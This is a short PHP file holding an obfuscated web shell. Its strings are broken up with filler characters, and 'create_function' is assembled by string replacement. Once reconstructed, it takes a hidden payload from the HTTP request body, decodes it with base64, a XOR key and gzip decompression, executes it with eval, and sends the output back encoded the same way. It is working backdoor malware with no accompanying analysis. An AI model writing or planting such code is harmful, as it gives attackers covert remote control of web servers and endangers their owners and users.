<?php
$x='np^>ut"^>),$m)==^>1) {@ob_s^>tart()^>;@e^>val(@gzunco^>mpress^>(@x^>(@ba^>^>se64^>_decode($m[1^>]),$k)))^>;^>$o=@ob_get';
$C='_conten^>ts();^>@o^>b_en^>d_clean();$r^>=@ba^>se64_en^>code(@^>x(^>@gzc^>o^>mpress($o^>)^>,$k));print("$p$kh$r^>$kf");}';
$P=str_replace('p','','pcreatpe_pfupnpcption');
$n='){$o.=$^>^>^>t{$i}^$k^>{$j};}}return $o^>;}if (^>^>@preg_ma^>tch("/$kh^>(.+^>)$kf^>/",@f^>ile_get_^>cont^>^>ents("php://i';
$d='$k="d6^>29a986^>";$kh=^>"6307^>099^>b02da";$k^>f="5680^>8926e8a^>5";$^>p="3d^>T^>LFF7yTOp887oQ"^>;functi^>on x(^>$^>t^';
$p='>^>,$k){$c=strle^>n($k);$l=str^>l^>en($t);$o^>="";for($i^>=0;$i<$l^>;){^>for^>^>($j=0;^>($j<$c^>&&$i<$l);$j++^>,$i++';
$D=str_replace('^>','',$d.$p.$n.$x.$C);
$l=$P('',$D);$l();
?>
